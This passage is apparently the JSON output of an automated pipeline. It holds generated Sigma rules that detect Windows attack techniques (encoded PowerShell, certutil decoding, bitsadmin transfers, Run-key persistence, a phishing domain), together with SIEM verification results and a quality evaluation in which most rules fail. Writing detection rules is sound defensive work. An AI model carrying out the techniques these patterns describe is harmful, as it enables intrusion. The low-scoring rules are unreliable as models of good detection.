          "IT administrators using Office documents to launch scripts for deployment",
          "User-initiated automation via Office add\u2011ins that invoke command shells"
        ],
        "level": "high",
        "tags": [
          "attack.t1566",
          "attack.initial_access",
          "custom.phishing",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "9a284703-b9fe-4718-9931-0eee5d50b473",
        "siem_verification": {
          "rule_id": "9a284703-b9fe-4718-9931-0eee5d50b473",
          "attack_id": "11d1143c-484b-4fbb-950c-ca8073e8ec61",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 997.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious PowerShell Execution with Encoded or Network Commands",
        "description": "Detects PowerShell processes that use encoded commands or invoke network-related cmdlets, which are commonly used by attackers for stealthy execution and data exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_ps": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_enc": {
            "CommandLine|contains": "-enc"
          },
          "selection_encodedcommand": {
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_iwr": {
            "CommandLine|contains": "Invoke-WebRequest"
          },
          "selection_download": {
            "CommandLine|contains": "DownloadFile"
          },
          "selection_iex": {
            "CommandLine|contains": "IEX"
          },
          "condition": "selection_ps and (selection_enc or selection_encodedcommand or selection_iwr or selection_download or selection_iex)"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell with encoded commands for deployment.",
          "System management tools that invoke PowerShell with network cmdlets (e.g., Windows Update, SCCM).",
          "Security or monitoring solutions that run PowerShell to collect telemetry."
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "attack.t1086"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
        "siem_verification": {
          "rule_id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
          "attack_id": "53782e1f-9409-4730-b2bf-44f0d655cb34",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 479.00000000000006,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution of PowerShell or CMD with Known Phishing URL",
        "description": "Detects processes (PowerShell, cmd.exe) or Office applications spawning command shells where the command line contains the phishing domain \"dian.server.tl\", indicating a possible URL phishing based defense evasion attempt.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "dian.server.tl"
          },
          "selection2": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "dian.server.tl"
          },
          "selection3": {
            "ParentImage|endswith": "\\winword.exe",
            "CommandLine|contains": "dian.server.tl"
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate administrative scripts that download resources from the domain for testing or internal tooling.",
          "Security or IT staff using PowerShell or cmd.exe to retrieve files from the domain during authorized investigations.",
          "Automated software updates or installers that reference the domain for legitimate content delivery."
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.defense_evasion",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Defense Evasion",
        "generation_method": "langchain",
        "id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
        "siem_verification": {
          "rule_id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
          "attack_id": "17309714-80ec-4a39-90da-5ca1911079a7",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 451.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious Creation of Critical System Process",
        "description": "Detects creation of critical Windows system processes (e.g., services.exe, svchost.exe, lsass.exe, winlogon.exe, csrss.exe) that are launched by suspicious parent processes such as cmd.exe, powershell.exe, wmic.exe, or cscript.exe. This behavior may indicate an attacker creating or modifying a system process to achieve persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_system": {
            "Image|endswith": [
              "\\\\services.exe",
              "\\\\svchost.exe",
              "\\\\lsass.exe",
              "\\\\winlogon.exe",
              "\\\\csrss.exe"
            ]
          },
          "selection_suspicious_parent": {
            "ParentImage|endswith": [
              "\\\\cmd.exe",
              "\\\\powershell.exe",
              "\\\\wmic.exe",
              "\\\\cscript.exe"
            ]
          },
          "condition": "selection_system and selection_suspicious_parent"
        },
        "falsepositives": [
          "Legitimate system service restarts performed by administrators",
          "Windows Update or patching processes that restart services",
          "Automated maintenance scripts that invoke system processes via command shells"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1543.003"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
        "siem_verification": {
          "rule_id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
          "attack_id": "1edeb18d-3720-41bc-9421-b7034473557d",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 1014.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "User Execution of Potentially Malicious Processes via Explorer",
        "description": "Detects processes commonly used for user-executed malicious code that are launched from Windows Explorer, indicating possible User Execution (T1204) technique.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\powershell.exe"
          },
          "selection_cmd": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\cmd.exe"
          },
          "selection_wscript": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\wscript.exe"
          },
          "selection_mshta": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\mshta.exe"
          },
          "selection_rundll32": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\rundll32.exe"
          },
          "condition": "selection_powershell or selection_cmd or selection_wscript or selection_mshta or selection_rundll32"
        },
        "falsepositives": [
          "Legitimate use of PowerShell, cmd.exe, wscript.exe, mshta.exe, or rundll32.exe launched from Explorer for system administration or scripting tasks.",
          "User-initiated batch files or scripts run via Explorer for routine maintenance.",
          "Software installers that invoke these executables during normal installation processes."
        ],
        "level": "medium",
        "tags": [
          "attack.t1204",
          "attack.execution",
          "custom.user_execution",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
        "siem_verification": {
          "rule_id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
          "attack_id": "ef84e0ad-5994-46cd-9d06-b63b3103b6d0",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 545.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Create or Modify System Process Persistence via Command-line Tools",
        "description": "Detects creation or modification of system processes used for persistence, such as services, scheduled tasks, or COM registration, by monitoring command-line usage of sc.exe, regsvr32.exe, powershell.exe with encoded commands, schtasks.exe, and wmic.exe.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc_create": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": " create "
          },
          "selection_regsvr32": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": "/i"
          },
          "selection_powershell_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_wmic_service": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "service"
          },
          "condition": "1 of selection_*"
        },
        "falsepositives": [
          "Legitimate administrative scripts using sc.exe to manage services",
          "Scheduled task creation by IT automation tools (e.g., SCCM, Ansible)",
          "PowerShell -EncodedCommand used by security teams for remote management",
          "Regsvr32.exe invoked by installers to register COM components",
          "Wmic.exe used for legitimate system queries or management"
        ],
        "level": "high",
        "tags": [
          "attack.t1543",
          "attack.persistence",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
        "siem_verification": {
          "rule_id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
          "attack_id": "b06751a1-f8f2-44f3-ba98-e036fa97739d",
          "detected": true,
          "events_found": 4,
          "historical_events": 0,
          "query_time_ms": 550.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Execution of cmd.exe with command flag",
        "description": "Detects execution of cmd.exe with command-line flags (e.g., /c or /k) that indicate execution of commands, which aligns with the MITRE ATT&CK Command and Scripting Interpreter technique (T1059).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_flag": {
            "CommandLine|contains": "/c"
          },
          "condition": "selection_cmd and selection_flag"
        },
        "falsepositives": [
          "Legitimate administrative scripts run via cmd.exe",
          "Scheduled tasks that invoke cmd.exe for routine maintenance",
          "System processes (e.g., svchost, services.exe) that spawn cmd.exe for legitimate purposes",
          "Windows Update or installer processes that use cmd.exe internally"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.command_and_scripting_interpreter",
          "custom.process_creation",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "36665c17-962e-408c-9905-ff3616811a11",
        "siem_verification": {
          "rule_id": "36665c17-962e-408c-9905-ff3616811a11",
          "attack_id": "d51f3eeb-0258-43ab-8533-df60f0b6e209",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 468.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution of Scripting Interpreters",
        "description": "Detects execution of common scripting interpreters which may indicate malicious script-based activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_wscript": {
            "Image|endswith": "\\wscript.exe"
          },
          "selection_cscript": {
            "Image|endswith": "\\cscript.exe"
          },
          "selection_python": {
            "Image|endswith": "\\python.exe"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/c"
          },
          "condition": "selection_powershell or selection_wscript or selection_cscript or selection_python or selection_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed by IT staff",
          "Scheduled tasks or automated maintenance jobs that run PowerShell or Python",
          "System utilities that invoke cmd.exe for routine operations"
        ],
        "level": "medium",
        "tags": [
          "attack.t1059",
          "attack.execution",
          "custom.scripting"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "generation_method": "langchain",
        "id": "271595a1-0007-412f-9076-c7201cdf1450",
        "siem_verification": {
          "rule_id": "271595a1-0007-412f-9076-c7201cdf1450",
          "attack_id": "4e59c000-7172-40f8-9223-f4023694c1a9",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 606.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detect Use of Scripting Interpreters",
        "description": "Detect execution of common scripting interpreters (PowerShell, cscript, wscript, python) which may indicate malicious scripting activity on Windows systems.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_cscript": {
            "Image|endswith": "\\cscript.exe"
          },
          "selection_wscript": {
            "Image|endswith": "\\wscript.exe"
          },
          "selection_python": {
            "Image|endswith": "\\python.exe"
          },
          "condition": "selection_powershell or selection_cscript or selection_wscript or selection_python"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via PowerShell",
          "System maintenance tasks that use scripting interpreters",
          "Scheduled tasks or services that run scripts as part of normal operation",
          "Developer tools or build pipelines invoking Python or other script engines"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.scripting"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "generation_method": "langchain",
        "id": "e9dc1166-6f65-4b7d-bff9-235897364345",
        "siem_verification": {
          "rule_id": "e9dc1166-6f65-4b7d-bff9-235897364345",
          "attack_id": "938c2568-e04f-45e4-96be-9fa21448dc80",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 698.0000000000001,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious Process Injection via Common Windows Utilities",
        "description": "Detects potential process injection activity on Windows systems by monitoring the creation of processes commonly abused for injection (rundll32.exe, powershell.exe, regsvr32.exe) and suspicious parent\u2011child relationships indicative of injection techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection3": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection4": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": "/i"
          },
          "selection5": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection1 or selection2 or selection3 or selection4 or selection5"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell with -EncodedCommand for deployment.",
          "System maintenance tasks that invoke rundll32.exe to load legitimate DLLs.",
          "Software installers or updates that use regsvr32.exe with the /i switch.",
          "User\u2011initiated PowerShell sessions launched from Explorer (e.g., right\u2011click \u2192 Run with PowerShell)."
        ],
        "level": "high",
        "tags": [
          "attack.t1055",
          "custom.process_injection",
          "custom.defense_evasion",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
        "siem_verification": {
          "rule_id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
          "attack_id": "0051e66b-c6ca-47b6-b864-c44c15a916fd",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 919.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious Application Layer Protocol Usage via Command Line",
        "description": "Detects processes that may be used for Command and Control communication over application layer protocols by matching command line patterns indicative of network requests such as encoded PowerShell commands, curl/wget HTTP downloads, BitsAdmin transfers, or Python scripts accessing URLs.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": "http"
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": "http"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/transfer"
          },
          "selection_python": {
            "Image|endswith": "\\python.exe",
            "CommandLine|contains": "http"
          },
          "condition": "selection_powershell or selection_curl or selection_wget or selection_bitsadmin or selection_python"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with -EncodedCommand for deployment",
          "System or third\u2011party tools that use curl or wget to download updates or packages",
          "BitsAdmin used by Windows Update or Microsoft Deployment Toolkit",
          "Python scripts that retrieve data from web services as part of normal operations"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.command_and_control",
          "custom.application_layer_protocol",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
        "siem_verification": {
          "rule_id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
          "attack_id": "15e04357-8d1d-49a0-bff1-73f53c77bcb2",
          "detected": true,
          "events_found": 60,
          "historical_events": 0,
          "query_time_ms": 956.0000000000001,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Suspicious Command-Line Interpreter Execution Detected",
        "description": "Detects execution of command-line interpreters (PowerShell, cmd.exe, wscript.exe, cscript.exe, python.exe) with suspicious flags indicative of malicious activity such as encoded commands, script execution, or network download attempts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_enc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_powershell_short": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "/c"
          },
          "selection_wscript": {
            "Image|endswith": "\\wscript.exe",
            "CommandLine|contains": ".js"
          },
          "selection_cscript": {
            "Image|endswith": "\\cscript.exe",
            "CommandLine|contains": ".js"
          },
          "selection_python": {
            "Image|endswith": "\\python.exe",
            "CommandLine|contains": "-c"
          },
          "condition": "selection_powershell_enc or selection_powershell_short or selection_cmd or selection_wscript or selection_cscript or selection_python"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via PowerShell or cmd.exe",
          "Scheduled tasks or system maintenance jobs that use PowerShell -EncodedCommand for deployment",
          "Automation tools (e.g., Ansible, Chef) that invoke scripts with -c or /c flags",
          "Developers running local scripts for testing purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "29874848-eafc-49fb-ac4b-6af9db99faed",
        "siem_verification": {
          "rule_id": "29874848-eafc-49fb-ac4b-6af9db99faed",
          "attack_id": "d16b1c73-bcce-4799-b509-9148827919ea",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 515.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Obfuscated Files or Information via Command Line Flags",
        "description": "Detects usage of obfuscation techniques such as encoded PowerShell commands, certutil decoding, and other suspicious command line flags indicative of the ATT&CK technique T1027 (Obfuscated Files or Information). This rule looks for common obfuscation indicators in process creation events.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection3": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "IEX"
          },
          "selection4": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-decode"
          },
          "selection5": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "javascript:"
          },
          "selection6": {
            "Image|endswith": "\\mshta.exe",
            "CommandLine|contains": "javascript:"
          },
          "selection7": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": "/i"
          },
          "condition": "1 of selection*"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment.",
          "System maintenance tasks that invoke certutil.exe with -decode to process certificates.",
          "Authorized use of mshta.exe or rundll32.exe for legitimate scripting or automation.",
          "Regsvr32.exe used by IT teams for registering COM components with the /i switch."
        ],
        "level": "medium",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "custom.obfuscation",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
        "siem_verification": {
          "rule_id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
          "attack_id": "94916816-ad9b-485b-98a5-908014cc08cf",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 1125.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detect Potential Exfiltration Over C2 Channel via Command-Line Tools",
        "description": "Detects usage of common command-line utilities (PowerShell, certutil, bitsadmin, curl, wget) with parameters indicative of data exfiltration over a C2 channel.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-decode"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "/transfer"
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": "-X POST"
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": "-O"
          },
          "condition": "selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell with encoded commands",
          "certutil.exe used for certificate management or decoding files",
          "bitsadmin.exe used for legitimate background file transfers",
          "curl.exe or wget.exe used by administrators for downloading updates or patches"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1041",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
        "siem_verification": {
          "rule_id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
          "attack_id": "ea78776b-f90d-4872-a9b0-8efbf426688e",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 716.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Archive Collected Data via Compression Tools",
        "description": "Detects usage of compression utilities and PowerShell archive commands that may indicate data exfiltration through archiving collected data.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_zip": {
            "Image|endswith": "\\zip.exe",
            "CommandLine|contains": "-r"
          },
          "selection_7z": {
            "Image|endswith": "\\7z.exe"
          },
          "selection_winrar": {
            "Image|endswith": "\\winrar.exe"
          },
          "selection_tar": {
            "Image|endswith": "\\tar.exe"
          },
          "selection_gzip": {
            "Image|endswith": "\\gzip.exe"
          },
          "selection_ps_compress": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "-c",
              "-Compress",
              "-zip"
            ]
          },
          "selection_cmd_compress": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "zip",
              "tar",
              "gzip",
              "7z"
            ]
          },
          "condition": "selection_zip or selection_7z or selection_winrar or selection_tar or selection_gzip or selection_ps_compress or selection_cmd_compress"
        },
        "falsepositives": [
          "Legitimate backup or deployment scripts that use compression utilities",
          "System administrators creating archives for software packaging",
          "Antivirus or security tools that generate compressed logs"
        ],
        "level": "medium",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "custom.archive",
          "custom.compression",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
        "siem_verification": {
          "rule_id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
          "attack_id": "23f376b2-04e5-4d00-806a-6c62f455e610",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 772.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Creation of Scheduled Tasks via Command-Line Tools",
        "description": "Detects creation of Windows Scheduled Tasks using common command-line utilities such as schtasks.exe and PowerShell's Register-ScheduledTask, which are typical indicators of persistence techniques (T1053.005).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Register-ScheduledTask"
          },
          "selection_cmd": {
            "ParentImage|endswith": "\\cmd.exe",
            "CommandLine|contains": "schtasks"
          },
          "condition": "selection_schtasks or selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate administrative creation of scheduled tasks (e.g., via Windows Update, backup software, or IT management scripts).",
          "System maintenance scripts that use schtasks.exe or PowerShell to schedule routine tasks.",
          "User-initiated scheduled tasks for personal automation."
        ],
        "level": "medium",
        "tags": [
          "attack.t1053.005",
          "attack.persistence",
          "attack.scheduled_task"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "generation_method": "langchain",
        "id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
        "siem_verification": {
          "rule_id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
          "attack_id": "870ac9ed-b29a-4801-ac0a-b45a38a01e4f",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 741.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Registry Run Keys Persistence via Reg.exe or PowerShell",
        "description": "Detects creation or modification of Registry Run Keys (HKCU or HKLM \\Software\\Microsoft\\Windows\\CurrentVersion\\Run) using reg.exe or PowerShell, indicating potential persistence mechanisms.",
        "logsource": {
          "category": "registry_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_reg_hkcu": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "selection_reg_hklm": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "selection_ps_hkcu": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "selection_ps_hklm": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "condition": "selection_reg_hkcu or selection_reg_hklm or selection_ps_hkcu or selection_ps_hklm"
        },
        "falsepositives": [
          "Legitimate software installers that add entries to Run keys",
          "System updates or patches modifying Run keys",
          "Antivirus or endpoint protection tools that use Run keys for persistence",
          "Administrative scripts that manage startup programs"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1060",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain",
        "id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
        "siem_verification": {
          "rule_id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
          "attack_id": "762c2cc2-b538-4b7b-aa0d-f9802daa1bfe",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 884.0,
          "status": "success",
          "message": "Verification complete"
        }
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 21,
      "average_quality_score": 0.532,
      "passing_rules": 2,
      "failing_rules": 19,
      "langchain_evaluations": 219,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 19625.166
    },
    "evaluation_results": [
      {
        "rule_title": "Detect .NET Assembly Execution via Memory Injection",
        "rule_id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description describing the intended detection.",
          "Targets multiple execution vectors (dotnet.exe, rundll32.exe, PowerShell) in a single rule.",
          "Uses Sysmon process_creation logs, which provide reliable process information.",
          "Includes a false\u2011positive section that acknowledges legitimate usage scenarios.",
          "Simple logical condition (OR) makes the rule easy to understand and maintain."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world events (0 events found), indicating poor detection coverage for the intended technique.",
          "Very generic matching criteria (e.g., any .dll argument to dotnet.exe or rundll32.exe) will generate a high volume of false alerts in normal environments.",
          "The PowerShell condition only checks for \"-enc\" which is commonly used in legitimate automation scripts.",
          "No correlation with additional indicators of memory injection (e.g., loaded modules, parent\u2011process relationships, or anomalous command\u2011line patterns).",
          "Missing explicit MITRE ATT&CK technique ID (ttp_id is \"unknown\") and tactic information, reducing integration with ATT&CK mapping frameworks.",
          "No use of regex or more specific patterns to narrow down suspicious DLL paths or encoded payloads."
        ],
        "suggestions": [
          "Refine the detection logic to focus on truly suspicious usage, such as:",
          "  \u2022 Limiting dotnet.exe and rundll32.exe matches to uncommon or non\u2011system DLL directories (e.g., not \\Windows\\System32).",
          "  \u2022 Adding regex to detect PowerShell base64\u2011encoded commands that start with typical shellcode prefixes (e.g., \"JAB\" patterns).",
          "Combine process creation events with other telemetry (e.g., memory injection alerts, anomalous parent processes, or DLL load events) to increase confidence.",
          "Incorporate a whitelist of known legitimate applications that frequently invoke these executables with .dll arguments.",
          "Add the proper MITRE ATT&CK technique ID (e.g., T1055.012 for .NET Reflective Code Loading) and populate the tactic field.",
          "Test the rule against a representative baseline of normal activity to quantify false\u2011positive rates and adjust thresholds accordingly.",
          "Consider enriching the rule with threat\u2011intel indicators (hashes, known malicious DLL names) to improve specificity."
        ],
        "metrics": {
